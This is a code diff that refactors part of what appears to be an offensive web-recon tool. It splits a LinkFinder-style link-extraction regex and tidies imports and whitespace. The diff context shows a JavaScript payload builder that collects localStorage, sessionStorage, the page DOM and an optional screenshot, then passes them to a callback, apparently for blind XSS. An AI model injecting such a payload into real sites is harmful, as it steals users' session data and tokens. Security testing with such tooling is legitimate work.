@@ -13,10 +13,10 @@
 # limitations under the License.
 
 import re
-import asyncio
 import aiohttp
 from typing import List, Dict, Set, Optional
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin
+
 
 class JSIntelligence:
     """
@@ -93,7 +93,13 @@ class JSIntelligence:
     }
 
     # Link Extraction Regex (Ported from LinkFinder)
-    LINK_REGEX = r"(?i)(?:\"|')((?:[a-z]{1,10}://|//)[^\"'/]{1,}\.[a-z]{2,}[^\"']{0,}|(?:/|\.\./|\./)[^\"'><,;| *()(%%$^/\\\[\]][^\"'><,;|()]{1,}|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{1,}\.(?:[a-z]{1,4}|action)(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{3,}(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)(?:[\?|#][^\"|']{0,}|))(?:\"|')"
+    LINK_REGEX = (
+        r"(?i)(?:\"|')((?:[a-z]{1,10}://|//)[^\"'/]{1,}\.[a-z]{2,}[^\"']{0,}|(?:/|\.\./|\./)"
+        r"[^\"'><,;| *()(%%$^/\\\[\]][^\"'><,;|()]{1,}|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{1,}\."
+        r"(?:[a-z]{1,4}|action)(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{3,}"
+        r"(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)"
+        r"(?:[\?|#][^\"|']{0,}|))(?:\"|')"
+    )
 
     def __init__(self, session: Optional[aiohttp.ClientSession] = None):
         self.session = session
@@ -122,7 +128,7 @@ class JSIntelligence:
             link = match.group(1).strip()
             if not link:
                 continue
-            
+
             # Resolve relative links
             try:
                 full_url = urljoin(base_url, link)
@@ -146,13 +152,16 @@ class JSIntelligence:
         payload += "try{d.ls=JSON.stringify(window.localStorage)}catch(e){}"
         payload += "try{d.ss=JSON.stringify(window.sessionStorage)}catch(e){}"
         payload += "try{d.dom=document.documentElement.outerHTML}catch(e){}"
-        
+
         if include_screenshot:
             # Note: Requires html2canvas to be present or loaded
-            payload += "try{html2canvas(document.body).then(function(c){d.scr=c.toDataURL();sendCallback(d);})}catch(e){sendCallback(d);}"
+            payload += (
+                "try{html2canvas(document.body).then(function(c){d.scr=c.toDataURL();"
+                "sendCallback(d);})}catch(e){sendCallback(d);}"
+            )
         else:
             payload += "sendCallback(d);"
-            
+
         payload += "})();"
         return payload
 
